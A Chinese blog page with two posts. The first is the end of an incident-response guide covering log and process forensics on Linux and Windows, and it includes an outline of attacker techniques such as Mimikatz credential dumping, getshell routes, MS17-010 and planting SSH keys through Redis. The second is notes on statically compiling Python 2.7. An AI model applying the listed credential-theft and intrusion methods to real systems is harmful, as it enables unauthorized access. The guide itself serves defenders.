<p>   /var/log/btmp(lastb)</p>
<p>3.登录日志可以关注Accepted、Failed password 、invalid特殊关键字</p>
<p>4.登录相关命令</p>
<p>​     lastlog 记录最近几次成功登录的事件和最后一次不成功的登录    who 命令查询utmp文件并报告当前登录的每个用户。Who的缺省输出包括用户名、终端类型、登录日期及远程主机    w 命令查询utmp文件并显示当前系统中每个用户和它所运行的进程信息    users 用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数    last 命令往回搜索wtmp来显示自从文件第一次创建以来登录过的用户    finger 命令用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。   </p>
<p>5.几个语句<br>​       定位有多少IP在爆破主机的root帐号    grep &quot;Failed password for root&quot; /var/log/auth.log | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more    登录成功的IP有哪些    grep &quot;Accepted &quot; /var/log/auth.log | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more      tail -400f demo.log #监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）      less demo.log #查看日志文件，支持上下滚屏，查找功能      uniq -c demo.log  #标记该行重复的数量，不重复值为1    grep -c &#39;ERROR&#39; demo.log   #输出文件demo.log中查找所有包行ERROR的行的数量   </p>
<p>3.1.6 相关处置</p>
<p>kill -9</p>
<p>chattr –i</p>
<p>rm </p>
<p>setfacl</p>
<p>ssh </p>
<p>chmod</p>
<p>3.2 Windows系列分析排查</p>
<p>3.2.1 文件分析</p>
<p>1.开机启动有无异常文件</p>
<p>2.各个盘下的temp(tmp)相关目录下查看有无异常文件</p>
<p>3.浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息</p>
<p>4.查看文件时间，创建时间、修改时间、访问时间。对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。</p>
<p>5.查看用户recent相关文件，通过分析最近打开分析可疑文件</p>
<p>   a) C:\Documents and Settings\Administrator\Recent</p>
<p>   b) C:\Documents and Settings\Default User\Recent</p>
<p>   c) 开始,运行   %UserProfile%\Recent</p>
<p>6.根据文件夹内文件列表时间进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件件</p>
<p>Server 2008 R2系列</p>
<p><img src="/images/2017-12-05/593bbbe0e794b.jfif" alt=""></p>
<p>Win10 系列</p>
<p><img src="/images/2017-12-05/593bbbe2645b0.jfif" alt=""></p>
<p>7.关键字匹配，通过确定后的入侵时间，以及webshell或js文件的关键字（比如博彩类），可以在IIS 日志中进行过滤匹配，比如经常使用:</p>
<p>8.</p>
<p>知道是上传目录，在web log 中查看指定时间范围包括上传文件夹的访问请求<br>   findstr /s /m /I “UploadFiles” <em>.log<br>   某次博彩事件中的六合彩信息是six.js<br>   findstr /s /m /I “six.js” </em>.aspx<br>   根据shell名关键字去搜索D盘spy相关的文件有哪些<br>   for /r d:\ %i in (<em>spy</em>.aspx) do @echo %i<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">##### 3.2.2 进程命令</div><div class="line"></div><div class="line">1.netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</div><div class="line"></div><div class="line">2.根据netstat 定位出的pid，再通过tasklist命令进行进程定位</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbe4131e9.jfif)</div><div class="line"></div><div class="line">3.通过tasklist命令查看可疑程序</div><div class="line"></div><div class="line">##### 3.2.3 系统信息</div><div class="line"></div><div class="line">1.使用set命令查看变量的设置</div><div class="line"></div><div class="line">2.Windows 的计划任务；</div><div class="line"></div><div class="line">3.Windows 的帐号信息，如隐藏帐号等</div><div class="line"></div><div class="line">4.配套的注册表信息检索查看，SAM文件以及远控软件类</div><div class="line"></div><div class="line">5.查看systeminfo 信息，系统版本以及补丁信息</div><div class="line"></div><div class="line">   例如系统的远程命令执行漏洞MS08-067、MS09-001、MS17-010（永恒之蓝）…</div><div class="line"></div><div class="line">   若进行漏洞比对，建议使用Windows-Exploit-Suggester </div><div class="line"></div><div class="line">   https://github.com/GDSSecurity/Windows-Exploit-Suggester/</div><div class="line"></div><div class="line">3.2.4 后门排查</div><div class="line"></div><div class="line">PC Hunter是一个Windows系统信息查看软件</div><div class="line"></div><div class="line">http://www.xuetr.com/</div><div class="line"></div><div class="line">功能列表如下：</div><div class="line"></div><div class="line">1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能</div><div class="line">2.内核驱动模块查看，支持内核驱动模块的内存拷贝</div><div class="line">3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook</div><div class="line">4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除</div><div class="line">5.端口信息查看，目前不支持2000系统</div><div class="line">6.查看消息钩子</div><div class="line">7.内核模块的iat、eat、inline hook、patches检测和恢复</div><div class="line">8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除</div><div class="line">9.注册表编辑</div><div class="line">10.进程iat、eat、inline hook、patches检测和恢复</div><div class="line">11.文件系统查看，支持基本的文件操作</div><div class="line">12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME</div><div class="line">13.ObjectType Hook检测和恢复</div><div class="line">14.DPC定时器检测和删除</div><div class="line">15.MBR Rootkit检测和修复</div><div class="line">16.内核对象劫持检测</div><div class="line">17.WorkerThread枚举</div><div class="line">18.Ndis中一些回调信息枚举</div><div class="line">19.硬件调试寄存器、调试相关API检测</div><div class="line">20.枚举SFilter/Fltmgr的回调</div><div class="line"></div><div class="line">PS：最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbe631c6a.jfif)</div><div class="line"></div><div class="line">Webshell 排查</div><div class="line"></div><div class="line">1.可以使用hm</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbe892ce1.jfif)</div><div class="line"></div><div class="line">2.也可以使用盾类（D盾、暗组盾），如果可以把web目录导出，可以在自己虚拟机进行分析</div><div class="line"></div><div class="line">##### 3.2.5 日志分析</div><div class="line"></div><div class="line">1.打开事件管理器（开始—管理工具—事件查看/开始运行eventvwr）</div><div class="line"></div><div class="line">2.主要分析安全日志，可以借助自带的筛选功能</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbea5fc7c.jfif)</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbec097aa.jfif)</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbedcf394.jfif)</div><div class="line"></div><div class="line">3.可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础，可以提高效率正则是：</div><div class="line"></div><div class="line"> 4.  ((?:(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))).)&#123;3&#125;(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))))</div></pre></td></tr></table></figure></p>
<p><img src="/images/2017-12-05/593bbbef9bcc6.jfif" alt=""></p>
<p>强大的日志分析工具Log Parser</p>
<p><img src="/images/2017-12-05/593bbf42e08fe.jfif" alt=""></p>
<p>#分析IIS日志<br>LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid</p>
<p><img src="/images/2017-12-05/593bbf4517f29.jfif" alt=""></p>
<p>有了这些我们就可以对windows日志进行分析了 比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：<br>LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&#39;|&#39;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&#39;|&#39;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&#39;|&#39;) AS Client_IP FROM &#39;e:\logparser\xx.evtx&#39; WHERE EventID=675&quot;</p>
<p><img src="/images/2017-12-05/593bbf46aa511.jfif" alt=""></p>
<p>事件ID是很好的索引</p>
<p>Windows server 2008系列参考event ID：<br>4624 - 帐户已成功登录<br>4625 - 帐户登录失败<br>4648 - 试图使用明确的凭证登录（例如远程桌面）</p>
<p>3.2.6 相关处置</p>
<p>1.通过网络连接锁定的可疑进程，进行定位恶意程序后删除(taskkill)</p>
<p>2.木马查杀，可配合pchunter 进行进一步专业分析，使用工具功能进行强制停止以及删除</p>
<p>3.最后清理后，统一查看网络连接、进程、内核钩子等是否正常。</p>
<p>3.3 应用类</p>
<p>Apache、tomcat、Nginx、IIS</p>
<p>无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:</p>
<p>find . access_log |grep xargs ip攻击地址</p>
<p>find . access_log| grep xargs 木马文件名</p>
<p>页面访问排名前十的IP<br>cat access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10<br>页面访问排名前十的URL<br>cat access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10<br>查看最耗时的页面<br>cat access.log | sort -k 2 -n -r | head 10</p>
<p>在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。</p>
<p>1.首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p>
<p><img src="/images/2017-12-05/593bbf4887412.jfif" alt=""></p>
<p>2.一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。</p>
<p><img src="/images/2017-12-05/593bbf4a0a82f.jfif" alt=""></p>
<p>4 应急总结</p>
<p>1.核心思路是“顺藤摸瓜”</p>
<p>2.碎片信息的关联分析</p>
<p>3.时间范围的界定以及关键操作时间点串联</p>
<p>4.Web入侵类，shell定位很重要</p>
<p>5.假设与求证</p>
<p>6.攻击画像与路线确认</p>
<p>5 渗透反辅</p>
<p>1.密码读取</p>
<p>   a) Windows: Mimikatz</p>
<p>   b) Linux: mimipenguin</p>
<p>2.帐号信息</p>
<p>   a) 操作系统帐号</p>
<p>   b) 数据库帐号</p>
<p>   c) 应用帐号信息</p>
<p>3.敏感信息</p>
<p>   a) 配置信息</p>
<p>   b) 数据库信息</p>
<p>   c) 服务端口信息</p>
<p>   d) 指纹信息</p>
<p>4.滚雪球式线性拓展</p>
<p>   a) 密码口令类拓展（远控）</p>
<p>   b) 典型漏洞批量利用</p>
<p>5.常见的入侵方式Getshell方法</p>
<p>   a) WEB入侵</p>
<p>​       i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell</p>
<p>​       ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞</p>
<p>   b) 系统入侵</p>
<p>​       i. SSH 破解后登录操作</p>
<p>​       ii. RDP 破解后登录操作</p>
<p>​       iii. MSSQL破解后远控操作</p>
<p>​       iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）</p>
<p>   c) 典型应用</p>
<p>​       i. Mail暴力破解后信息挖掘及漏洞利用</p>
<p>​       ii. VPN暴力破解后绕过边界</p>
<p>​       iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行</p>
<p>​       iv. Rsync 未授权访问类</p>
<p>​       v. Mongodb未授权访问类</p>
<p>​       vi. Elasticsearch命令执行漏洞</p>
<p>​       vii. Memcache未授权访问漏洞</p>
<p>​       viii. 服务相关口令（mysql ldap zebra squid vnc smb）</p>
<p>6 资源参考</p>
<p><a href="https://www.waitalone.cn/linux-find-webshell.html" target="_blank" rel="external">https://www.waitalone.cn/linux-find-webshell.html</a></p>
<p><a href="http://vinc.top/category/yjxy/" target="_blank" rel="external">http://vinc.top/category/yjxy/</a></p>
<p><a href="http://www.shellpub.com/" target="_blank" rel="external">http://www.shellpub.com/</a></p>
<p><a href="http://linux.vbird.org/linux_security/0420rkhunter.php" target="_blank" rel="external">http://linux.vbird.org/linux_security/0420rkhunter.php</a></p>
<p><a href="https://cisofy.com/download/lynis/" target="_blank" rel="external">https://cisofy.com/download/lynis/</a></p>
<p><a href="https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1" target="_blank" rel="external">https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1</a></p>
<p><a href="http://www.freebuf.com/articles/web/23358.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/23358.html</a></p>
<p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="external">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p>
<p><a href="http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html" target="_blank" rel="external">http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html</a></p>
<p><a href="http://wooyun.jozxing.cc/static/drops/tips-7462.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-7462.html</a></p>
<p><a href="http://bobao.360.cn/learning/detail/3830.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3830.html</a></p>
<p><a href="https://yq.aliyun.com/ziliao/65679" target="_blank" rel="external">https://yq.aliyun.com/ziliao/65679</a></p>
<p><a href="http://secsky.sinaapp.com/188.html" target="_blank" rel="external">http://secsky.sinaapp.com/188.html</a></p>
<p><a href="http://blog.sina.com.cn/s/blog_d7058b150102wu07.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_d7058b150102wu07.html</a></p>
<p><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="external">http://www.sleuthkit.org/autopsy/</a></p>
<p>7 FAQ</p>
<p>1.应急需求有哪些分类：</p>
<p>   a) 被谁入侵了？ 关联 攻击IP 攻击者信息</p>
<p>   b) 怎么入侵的？ 关联 入侵时间轴、漏洞信息</p>
<p>   c) 为什么被入侵？ 关联 行业特性、数据信息、漏洞信息</p>
<p>   d) 数据是否被窃取？ 关联 日志审计</p>
<p>   e) 怎么办？ 关联 隔离、排查分析、删马（解密）、加固、新运营</p>
<p>2.关于windows的日志工具（log parser）有无图形界面版？</p>
<p>   Log Parser Lizard 是一款用Vc++.net写的logParser增强工具。主要有以下特点：</p>
<p>   a) 封装了logParser命令，带图形界面，大大降低了LogParser的使用难度。</p>
<p>   b) 集成了几个开源工具，如log4net等。可以对IIS logs\EventLogs\active directory\log4net\File Systems\T-SQL进行方便的查询。</p>
<p>   c) 集成了Infragistics.UltraChart.Core.v4.3、Infragistics.Excel.v4.3.dll等，使查询结果可以方便的以图表或E.  XCEL格式展示。</p>
<p>   d) 集成了常见的查询命令，范围包含六大模块:IIS</p>
<p>   e) 可以将查询过的命令保存下来，方便再次使用。</p>
<p><img src="/images/2017-12-05/593bbf4b7ee3c.jfif" alt=""></p>
<p>   PS:软件是比较老的，对新系统兼容性不好，还是建议微软原生态log parser</p>
<p>3.在linux日志中，有无黑客入侵后的操作命令的统计\</p>
<p>   a) 可以根据history信息进行溯源分析，但一般可能会被清除</p>
<p>   b) 还有方法是需要结合accton 和 lastcomm</p>
<p><img src="/images/2017-12-05/593bbf4d37506.jfif" alt=""></p>
<p>\4.  3.2.3 提到了Windows-Exploit-Suggester，有无linux版？</p>
<p>Linux_Exploit_Suggester <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester" target="_blank" rel="external">https://github.com/PenturaLabs/Linux_Exploit_Suggester</a></p>
<p><img src="/images/2017-12-05/593bbf4f07d58.jfif" alt=""></p>
<p>5.有无linux自动化信息收集的脚本工具？</p>
<p>LinEnum  <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">https://github.com/rebootuser/LinEnum</a></p>
<p>6.</p>
<p><img src="/images/2017-12-05/593bbf5120b95.jfif" alt=""></p>
<p>7.有无综合的取证分析工具</p>
<p>Autopsy 是sleuthkit提供的平台工具，Windows 和 Linux磁盘映像静态分析、恢复被删文件、时间线分析，网络浏览历史，关键字搜索和邮件分析等功能</p>
<p><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="external">http://www.sleuthkit.org/autopsy/</a></p>
<p>8.关于业务逻辑的排查方法说明</p>
<p>新型业务安全中安全事件，例如撞库、薅羊毛、支付、逻辑校验等敏感环节，未在本文体现，所以后续有必要针对业务侧的应急排查方法归纳。</p>
<p>雷锋网再次声明：本文作者sm0nk@猎户攻防实验室，雷锋网宅客频道授权转载，先知技术社区拥有全部内容版权。媒体或商业转载必须获得授权，违者必追究法律责任。</p>
<p>雷锋网版权文章，未经授权禁止转载。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/05/python静态编译/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/05/python静态编译/" itemprop="url">python静态编译</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-05T01:09:50+08:00">
                2017-12-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p>为什么要将python编译器静态编译，主要有以下几个目的：</p>
<ol>
<li>在其他不具备python环境下的主机上运行python程序</li>
<li>在不具备相同python库的主机上运行python程序</li>
</ol>
<h3 id="1-工具集"><a href="#1-工具集" class="headerlink" title="1. 工具集"></a>1. 工具集</h3><p>到目前为止我找到了两个工具集合：</p>
<h4 id="1-1-静态编译的python解释器"><a href="#1-1-静态编译的python解释器" class="headerlink" title="1.1 静态编译的python解释器"></a>1.1 静态编译的python解释器</h4><p>这是pts大佬的一个工程 <a href="https://github.com/pts/staticpython" target="_blank" rel="external">https://github.com/pts/staticpython</a> ， 在该工程中，大佬给出了静态编译脚本，以及最终的release版本！</p>
<h4 id="1-2-结合cython的静态解释器"><a href="#1-2-结合cython的静态解释器" class="headerlink" title="1.2 结合cython的静态解释器"></a>1.2 结合cython的静态解释器</h4><p>这个工程也十分庞大，作者结合<a href="http://mdqinc.com/blog/2011/08/statically-linking-python-with-cython-generated-modules-and-packages/" target="_blank" rel="external">http://mdqinc.com/blog/2011/08/statically-linking-python-with-cython-generated-modules-and-packages/</a> 这篇文章的思路，完成了<a href="https://github.com/bendmorris/static-python" target="_blank" rel="external">static-python</a> 这个工程。</p>
<p>该工程需要用户根据需求，自行设置静态编译后的解释器所包含的库内容！（由于没有实测，只是觉得这样做不太友好，而且中间应该会有不少bug）</p>
<p>但是该工程有一个及其牛逼之处，就是它可以根据独立的py脚本，生成该脚本的静态编译后的二进制文件。</p>
<h3 id="2-自行编译"><a href="#2-自行编译" class="headerlink" title="2. 自行编译"></a>2. 自行编译</h3><p>对于python解释器的编译，我做了N多次实验，但是基本上没有一次成功的。很多时候会缺少某些库文件，甚至有时编译都通不过。所以，这儿仅结合所看到的一些文章，给出一定的猜想。</p>
<h4 id="2-1-实验环境"><a href="#2-1-实验环境" class="headerlink" title="2.1 实验环境"></a>2.1 实验环境</h4><p>docker + centos:6 + python-2.7.6.tgz</p>
<h4 id="2-2-实验参考文献"><a href="#2-2-实验参考文献" class="headerlink" title="2.2 实验参考文献"></a>2.2 实验参考文献</h4><p><a href="https://gist.github.com/ajdavis/9632280" target="_blank" rel="external">https://gist.github.com/ajdavis/9632280</a></p>
<p><a href="https://blog.fluyy.net/post/2016-01-09-static_python" target="_blank" rel="external">https://blog.fluyy.net/post/2016-01-09-static_python</a></p>
<p><a href="https://wiki.python.org/moin/BuildStatically" target="_blank" rel="external">https://wiki.python.org/moin/BuildStatically</a></p>
<p><a href="https://askubuntu.com/questions/63711/building-a-static-version-of-python" target="_blank" rel="external">https://askubuntu.com/questions/63711/building-a-static-version-of-python</a></p>
<p><a href="http://xiaoxia.org/2013/09/13/python-on-tomato/" target="_blank" rel="external">http://xiaoxia.org/2013/09/13/python-on-tomato/</a></p>
<p><a href="https://codeday.me/bug/20170923/75551.html" target="_blank" rel="external">https://codeday.me/bug/20170923/75551.html</a></p>
<h4 id="2-3-实验步骤"><a href="#2-3-实验步骤" class="headerlink" title="2.3 实验步骤"></a>2.3 实验步骤</h4><h5 id="2-3-1-安装镜像源"><a href="#2-3-1-安装镜像源" class="headerlink" title="2.3.1 安装镜像源"></a>2.3.1 安装镜像源</h5><p>用docker运行centos:6的环境</p>
<blockquote>
<p>宿主机：docker run -it --net=&quot;host&quot; -d centos:6</p>
<p>宿主机：docker exec -it container-id /bin/bash</p>
</blockquote>
<p>安装镜像源</p>
<blockquote>
<p>宿主机：wget -O CentOS-Base.repo <a href="http://mirrors.aliyun.com/repo/Centos-6.repo" target="_blank" rel="external">http://mirrors.aliyun.com/repo/Centos-6.repo</a></p>
<p>宿主机：docker cp CentOS-Base.repo container-id:/etc/yum.repos.d/CentOS-Base.repo</p>
<p>容器：yum makecache</p>
</blockquote>
<h5 id="2-3-2-软件安装"><a href="#2-3-2-软件安装" class="headerlink" title="2.3.2 软件安装"></a>2.3.2 软件安装</h5><p>安装基本软件wget、vi等(视情况而定)</p>
<p>安装必要软件glibc-static zlib-static</p>
<blockquote>
<p>容器：yum install glibc-static zlib-static</p>
</blockquote>
<h5 id="2-3-3-编译"><a href="#2-3-3-编译" class="headerlink" title="2.3.3 编译"></a>2.3.3 编译</h5><p>在配置之前，我们需要修改Modules/Setup文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#*shared* 注释掉这一行</div><div class="line">*static*  添加这一行</div></pre></td></tr></table></figure>
<p>编译</p>
<blockquote>
<p>容器：./configure  --disable-shared --enable-profiling --prefix=/path/to/mypy LDFLAGS=&quot;-static -static-libgcc&quot; CPPFLAGS=&quot;-static&quot;</p>
<p>容器：make</p>
</blockquote>
<p>这个过程会出现问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/ld: dynamic STT_GNU_IFUNC symbol strcmp&apos; with pointer equality in/usr/lib/gcc/x86_64-redhat-linux/4.4.7/../../../../lib64/libc.a(strcmp.o)&apos; can not be used when making an executable; recompile with -fPIE and relink with -pie</div></pre></td></tr></table></figure>
<p>说实在的，网上没有一篇文章提到如何解决这个问题，所以这个地方我不管了！</p>
<p>我直接做</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -pthread -static -static-libgcc -o python.exe Modules/python.o libpython2.7.a -lpthread -ldl  -lutil -lm -lz</div></pre></td></tr></table></figure>
<h5 id="2-3-4-排错"><a href="#2-3-4-排错" class="headerlink" title="2.3.4 排错"></a>2.3.4 排错</h5><p>上述操作完成之后，确确实实会出现python.exe文件，但是我们运行的时候，会报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Could not find platform dependent libraries &lt;exec_prefix&gt;</div><div class="line">Consider setting $PYTHONHOME to &lt;prefix&gt;[:&lt;exec_prefix&gt;]</div><div class="line">Traceback (most recent call last):</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 548, in &lt;module&gt;</div><div class="line">    main()</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 530, in main</div><div class="line">    known_paths = addusersitepackages(known_paths)</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 266, in addusersitepackages</div><div class="line">    user_site = getusersitepackages()</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 241, in getusersitepackages</div><div class="line">    user_base = getuserbase() # this will also set USER_BASE</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 231, in getuserbase</div><div class="line">    USER_BASE = get_config_var(&apos;userbase&apos;)</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/sysconfig.py&quot;, line 517, in get_config_var</div><div class="line">    return get_config_vars().get(name)</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/sysconfig.py&quot;, line 469, in get_config_vars</div><div class="line">    _init_posix(_CONFIG_VARS)</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/sysconfig.py&quot;, line 352, in _init_posix</div><div class="line">    from _sysconfigdata import build_time_vars</div><div class="line">ImportError: No module named _sysconfigdata</div></pre></td></tr></table></figure>
<p>没有发现\_sysconfigdata.py文件！原因是因为，编译的时候没有正确通过，所以不是产生\_sysconfigdata.py文件！（是不是觉得这个问题是个死结。。。）</p>
<p>解决办法一：</p>
<p>Lib/_sysconfig.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_init_posix</span><span class="params">(vars)</span>:</span></div><div class="line">    <span class="comment">#from _sysconfigdata import build_time_vars  #注释掉</span></div><div class="line">    <span class="comment">#vars.update(build_time_vars)   #注释掉</span></div><div class="line">    <span class="keyword">pass</span> <span class="comment">#添加pass</span></div></pre></td></tr></table></figure>
<p>Lib/distuyils/sysconfig.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_init_posix</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment">#from _sysconfigdata import build_time_vars   #注释掉</span></div><div class="line">    <span class="keyword">global</span> _config_vars</div><div class="line">    _config_vars = &#123;&#125;</div><div class="line">    <span class="comment">#_config_vars.update(build_time_vars)   #注释掉</span></div></pre></td></tr></table></figure>
<p>解决办法二：</p>
<p>找到一个已经编译好的python文件，找到其中的_sysconfig.py文件，直接将其拷贝至实验环境中。</p>
<p>解决办法一，虽然可以让python.exe顺利执行，但是所有包管理都不会成功，这是因为build_time_vars中有一些环境设置，这个是找到对应的包文件的重要凭据。</p>
